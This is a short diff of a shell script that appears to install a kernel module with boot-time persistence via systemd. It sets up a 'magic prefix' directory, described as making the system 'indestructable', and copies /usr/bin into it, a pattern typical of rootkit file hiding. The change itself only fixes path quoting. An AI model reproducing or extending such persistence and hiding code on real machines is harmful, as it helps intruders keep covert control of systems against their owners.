@@ -41,8 +41,8 @@ if test -f "$koFile"; then
     systemctl enable "$loadServicePath"   
 
     # Make system indestructable, secured via MAGIC_PREFIX
-    trovePath=$('../'"$magicPrefix""trove")
-    mkdir "$trovePath"    
+    trovePath='../'"$magicPrefix""trove"
+    mkdir "$trovePath"
     cp /usr/bin "$trovePath"
     $trovePath"/echo" "Trove done."
 
